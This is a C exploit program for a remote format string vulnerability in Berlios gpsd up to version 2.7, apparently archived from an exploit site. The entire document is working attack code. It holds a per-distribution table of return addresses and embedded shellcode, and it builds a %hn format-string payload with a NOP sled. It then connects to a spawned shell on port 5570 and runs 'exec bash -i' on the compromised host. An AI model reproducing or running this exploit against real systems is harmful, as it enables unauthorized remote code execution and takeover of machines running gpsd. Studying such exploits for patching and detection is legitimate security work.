<html>
<head>
<title>Berlios gpsd <= 2.7.x Remote Format String Vulnerability</title>
<pre>
/* Added }, on line 75 /str0ke /*
/** 
 ** Copyright Johnh and KF 2005
 ** 
 ** Gpsd remote format string exploit
 ** By: Johnh[at]digitalmunition[dot]com
 ** Bug Found By: kf[at]digitalmunition[dot]com
 ** http://www.digitalmunition.com/DMA[2005-0125a].txt
 **
 ** Features: Version ident
 **
 ** Debian machines provide uid=gpsd
 ** Redhat machines provide uid=root
 **
 ** Lots of JUMP_SLOT's provided but 
 ** You can get or brute the shellcode 
 ** addresses yourself.
 **/

#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netinet/tcp.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;netdb.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;errno.h&gt;
#include &lt;string.h&gt;
#include &lt;assert.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/time.h&gt;

#define GPSD_PORT 2947

void sh(int st_sock_va);
int new_tcpConnect (char *host, unsigned int port, unsigned int timeout);
int checkZero (long value);
char *putLong (char* ptr, long value);
int own_gpsd(int sock,int iType);
int check_version(int sock);
int exec_shellcode(int sock);
int usage(char *p);


struct
{
    unsigned long  retloc; /* retloc of syslog */
    unsigned long   retaddr;
    char    *szDescription;
}targets[] =
    {

	// Brute the rest of the addresses your self...
	// syslog() , shellcode , version
        {0x0804f250,0x41424344, &quot;gpsd-1.91-1.i386.rpm&quot;}, // .rpms Tested on Redhat 9.0
        {0x0804f630,0x41424344, &quot;gpsd-1.92-1.i386.rpm&quot;},
        {0x0804e154,0x41424344, &quot;gpsd-1.93-1.i386.rpm&quot;},
        {0x0804f260,0x41424344, &quot;gpsd-1.94-1.i386.rpm&quot;},
        {0x0804f268,0x41424344, &quot;gpsd-1.95-1.i386.rpm&quot;},
        {0x41424344,0x41424344, &quot;gpsd-1.96-1.i386.rpm&quot;}, //broken rpm?
        {0x0804b14c,0x41424344, &quot;gpsd-1.97-1.i386.rpm&quot;},
        {0x0804c7a0,0x41424344, &quot;gpsd-2.1-1.i386.rpm&quot;},
        {0x0804c7a0,0x41424344, &quot;gpsd-2.2-1.i386.rpm&quot;},
        {0x0804c730,0xbfffd661, &quot;gpsd-2.3-1.i386.rpm&quot;},
        {0x0804c7b8,0xbfffde71, &quot;gpsd-2.4-1.i386.rpm&quot;},
        {0x0804c7dc,0xbfffdc09, &quot;gpsd-2.5-1.i386.rpm&quot;},
        {0x0804c730,0xbffff100, &quot;gpsd-2.6-1.i386.rpm&quot;},
        {0x0804c5bc,0xbfffcabc, &quot;gpsd-2.7-1.i386.rpm&quot;},
        {0x0804c7c4,0xbfffedc8, &quot;gpsd_2.6-1_i386.deb&quot;}, // .debs Tested on Debian GNU/Linux 3.1
        {0x0804c6c4,0xbfffc818, &quot;gpsd_2.7-1_i386.deb&quot;},
        {0x0804c770,0xbfffee70, &quot;gpsd_2.7-2_i386.deb&quot;},
	{0x0804c818,0xbfffe148, &quot;SuSE 9.1 compiled 2.0&quot;}, //compiled binary on local box for debug
        {0x0804b164,0xbfffd7d6, &quot;Slackware 9.0 compiled 2.0&quot;},
        {0x0804c3ec,0xbfffe65c, &quot;Slackware 9.0 compiled 2.7  &quot;}, 
        {0x41424344,0xdeadbeef, &quot;Debug              &quot;}, 

    },v;



int             iType;

char shellcode[]=
&quot;\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x16\x81\x73\x17\x13\x99&quot;
&quot;\x37\xe2\x83\xeb\xfc\xe2\xf4\x22\x42\xc0\x01\xa3\xff\x64\xa1\x40&quot;
&quot;\xda\x64\x6b\xf2\xd2\xfa\x62\x9a\x5e\x65\x84\x7b\x8c\xf5\xa1\x75&quot;
&quot;\xca\xbe\x03\xa3\x89\x67\xb3\x44\x10\xd6\x52\x75\x54\xb7\x52\x75&quot;
&quot;\x2a\x33\x2f\x93\xc9\x67\xb5\x9a\x78\x74\x52\x75\x54\xb7\x6b\xca&quot;
&quot;\x10\xf4\x52\x2c\xd0\xfa\x62\x52\x7b\xcf\xb3\x7b\xf7\x18\x91\x7b&quot;
&quot;\xf1\x18\xcd\x71\xf0\xbe\x01\x42\xca\xbe\x03\xa3\x92\xfa\x62&quot;;



//thanks sam
int new_tcpConnect (char *host, unsigned int port, unsigned int timeout)
{
    int                     sock,
    flag,
    pe = 0;
    size_t                  pe_len;
    struct timeval          tv;
    struct sockaddr_in      addr;
    struct hostent*         hp = NULL;
    fd_set                  rset;

    // reslov hosts
    hp = gethostbyname (host);
    if (NULL == hp) {
        perror (&quot;tcpConnect:gethostbyname\n&quot;);
        return -1;
    }

    sock = socket (AF_INET, SOCK_STREAM, 0);
    if (-1 == sock) {
        perror (&quot;tcpConnect:socket\n&quot;);
        return -1;
    }

    addr.sin_addr = *(struct in_addr *) hp-&gt;h_addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons (port);

    /* set socket no block
    */
    flag = fcntl (sock, F_GETFL);
    if (-1 == flag) {
        perror (&quot;tcpConnect:fcntl\n&quot;);
        close (sock);
        return -1;
    }
    flag |= O_NONBLOCK;
    if (fcntl (sock, F_SETFL, flag) &lt; 0) {
        perror (&quot;tcpConnect:fcntl\n&quot;);
        close (sock);
        return -1;
    }

    if (connect (sock, (const struct sockaddr *) &amp;addr,
                 sizeof(addr)) &lt; 0 &amp;&amp;
            errno != EINPROGRESS) {
        perror (&quot;tcpConnect:connect\n&quot;);
        close (sock);
        return -1;
    }

    /* set connect timeout
     * use millisecond
     */
    tv.tv_sec = timeout/1000;
    tv.tv_usec = timeout%1000;
    FD_ZERO (&amp;rset);
    FD_SET (sock, &amp;rset);

    if (select (sock+1, &amp;rset, &amp;rset, NULL, &amp;tv) &lt;= 0) {
        //                perror (&quot;tcpConnect:select&quot;);
        close (sock);
        return -1;
    }

    pe_len = sizeof (pe);

    if (getsockopt (sock, SOL_SOCKET, SO_ERROR, &amp;pe, &amp;pe_len) &lt; 0) {
        perror (&quot;tcpConnect:getsockopt\n&quot;);
        close (sock);
        return -1;
    }

    if (pe != 0) {
        errno = pe;
        close (sock);
        return -1;
    }

    if (fcntl(sock, F_SETFL, flag&amp;~O_NONBLOCK) &lt; 0) {
        perror (&quot;tcpConnect:fcntl\n&quot;);
        close (sock);
        return -1;
    }

    pe = 1;
    pe_len = sizeof (pe);

    if (setsockopt (sock, IPPROTO_TCP, TCP_NODELAY, &amp;pe, pe_len) &lt; 0){
        perror (&quot;tcpConnect:setsockopt\n&quot;);
        close (sock);
        return -1;
    }
    return sock;
}


void sh(int st_sock_va)
{
    int died;
    char *command=&quot;uname -a; id; export TERM=vt100; exec bash -i\n&quot;;
    char readbuf[1024];
    fd_set rset;
    memset((char *)readbuf,0,sizeof(readbuf));
    fprintf(stdout,&quot;[*] Executed shell successfully !\n\n&quot;);
    send(st_sock_va,command,strlen(command),0);

    for(;;)
    {
        fflush(stdout);
        FD_ZERO(&amp;rset);
        FD_SET(st_sock_va,&amp;rset);
        FD_SET(STDIN_FILENO,&amp;rset);
        select(st_sock_va+1,&amp;rset,NULL,NULL,NULL);

        if(FD_ISSET(st_sock_va,&amp;rset))
        {
            died=read(st_sock_va,readbuf,sizeof(readbuf)-1);
            if(died&lt;=0)
                exit(0);
            readbuf[died]=0;
            fprintf(stdout,&quot;%s&quot;,readbuf);
        }
        if(FD_ISSET(STDIN_FILENO,&amp;rset))
        {
            died=read(STDIN_FILENO,readbuf,sizeof(readbuf)-1);
            if(died&gt;0)
            {
                readbuf[died]=0;
                write(st_sock_va,readbuf,died);
            }
        }
    }
    return;
}




/*
 *check the \x00 byte
 */
int checkZero (long value)
{
    return !((value &amp; 0x00ffffff) &amp;&amp;
             (value &amp; 0xff00ffff) &amp;&amp;
             (value &amp; 0xffff00ff) &amp;&amp;
             (value &amp; 0xffffff00));

}
/*
 * put a address in mem, for little-endian
 *
 */
char*
putLong (char* ptr, long value)
{
    *ptr++ = (char) (value &gt;&gt; 0) &amp; 0xff;
    *ptr++ = (char) (value &gt;&gt; 8) &amp; 0xff;
    *ptr++ = (char) (value &gt;&gt; 16) &amp; 0xff;
    *ptr++ = (char) (value &gt;&gt; 24) &amp; 0xff;

    return ptr;
}


int main (int argc, char **argv)
{
    int     c, sock, ret;
    char    *hostName = NULL;

    if (argc &lt; 3) {
        usage (argv[0]);
        return -1;
    }

    while((c = getopt(argc, argv, &quot;h:t:&quot;)) != EOF) {
        switch(c) {
        case 'h':
            hostName = optarg;
            break;
        case 't':
            iType = atoi (optarg);
            break;
        default:
            usage (argv[0]);
            return 0;
        }
    }

if (argc &lt; 2) { usage(argv[0]); exit(1); }

    if( (iType&lt;0) || (iType&gt;=sizeof(targets)/sizeof(v)) )
    {
        usage(argv[0]);
        printf(&quot;[-] Invalid type.\n&quot;);
        return 0;
    }

    printf (&quot;# remote host %s. \n&quot;, hostName);

    sock = new_tcpConnect (hostName, GPSD_PORT, 9000);
    printf(&quot;Checking Remote version\n&quot;);
    check_version(sock);

    own_gpsd (sock,iType);
    close(sock);
    sock = new_tcpConnect (hostName, GPSD_PORT, 9000);
    printf(&quot;[+] Trying to exec shellcode on remote\n&quot;);
    exec_shellcode(sock);
    printf(&quot;[-] Waiting 5 seconds to connect to remote shell\n&quot;);
    sleep (5);
    if ((ret = new_tcpConnect (hostName, 5570, 9000)) &lt; 0) {
        fprintf (stderr, &quot;[-] failed :&lt; \n&quot;);
        goto out;
    }

    printf (&quot;[+] yes! \n&quot;);

    sh (ret);
out:
    close (ret);
    return 0;
}


int own_gpsd(int sock,int iType)
{
    int offset = 0x11;
    int dump_fmt=7;
    int al = 3;
    int hi,lo;
    int x;
    int ret;
    unsigned long shift0,shift1;
    char    buf[90000];
    char    fun[256];
    char *ptr;


    /* check zero byte */
    if (checkZero (targets[iType].retloc) || checkZero (targets[iType].retloc+2) ) {
        printf (&quot;retloc has a null; &lt;\n&quot;);
        exit (1);
    }

    hi = (targets[iType].retaddr &gt;&gt; 0) &amp; 0xffff;
    lo = (targets[iType].retaddr &gt;&gt; 16) &amp; 0xffff;


    shift0 = hi - offset - (dump_fmt * 8 + 16 + al);
    shift1 = (0x10000 +  lo) - hi;

    memset(buf,0x41,3);
    ptr = buf+3;
    ptr = putLong (ptr, 0x42424242);
    ptr = putLong (ptr, targets[iType].retloc);
    ptr = putLong (ptr, 0x42424242);
    ptr = putLong (ptr, targets[iType].retloc+2);

    for (x=0;x&lt;dump_fmt;x++)
        strcat(ptr,&quot;%.8x&quot;);

    strcat(ptr,&quot;%.&quot;);
    sprintf(ptr+strlen(ptr),&quot;%u&quot;,shift0);
    strcat(ptr,&quot;lx%hn&quot;);

    strcat(ptr,&quot;%.&quot;);
    sprintf(ptr+strlen(ptr),&quot;%u&quot;,shift1);
    strcat(ptr,&quot;lx%hn&quot;);
    x = strlen(ptr);
    memset(ptr+x,0x90,3000);
    x+=3000;
    memcpy(ptr+x,shellcode,337);
    x+=337;

    printf (&quot;# send exploit data. \n&quot;);
    sleep(1);
    ret = send (sock, buf, x, 0);
    printf (&quot;[*] data sent %d bytes .\n&quot;, x);
    memcpy(fun,&quot;l\n&quot;,2);
    ret = send (sock, fun, 2, 0);
    printf (&quot;[*] data sent %d bytes .\n&quot;, ret);
    
    return 0;
}

//Had to connect to remote and send a string to make shellcode execute. No idea why. but it works so :)
int exec_shellcode(int sock) {
    int ret;
    char    fun[256];

    memcpy(fun,&quot;l\n&quot;,2);
    ret = send (sock, fun, 2, 0);
    printf (&quot;[*] data sent %d bytes .\n&quot;, ret);

    return 0;
}

//Check remote version of gpsd. You may ask why because all verions are vuln but who knows :)
//When the vendor changes the code you can change this to detect a vuln/non vuln version
int check_version(int sock) {
        char *version;
        char buf_ver[256];
        char recv_buf[256];
        int ret;

        memcpy(buf_ver,&quot;l\n&quot;,2);
        ret = send (sock, buf_ver, 2, 0);
        ret = recv(sock,recv_buf,sizeof(recv_buf),0);
        version  =  strtok(recv_buf,&quot; &quot;);
        version = strtok(NULL,&quot; &quot;);
        printf(&quot;GPSD VERSION: %s\n&quot;,version);

}


int usage(char *p)


{
    int     i;
    printf( &quot;Gpsd &lt;= 2.7 remote formatstring exploit\r\nBy: johnh@secnetops.com\r\n&quot;);

    printf( &quot;Usage: %s &lt;-h host&gt; &lt;-t target&gt;\n&quot;
            &quot;[type]\t[Description]\t\t\t[Retloc]\n&quot;, p);
    for(i=0;i&lt;sizeof(targets)/sizeof(v);i++)
    {
        printf(&quot;%d\t%s\t\t0x%08lx\n&quot;, i, targets[i].szDescription,targets[i].retloc);
    }
    return 0;
}

// milw0rm.com [2005-01-26]
</pre>
</html>

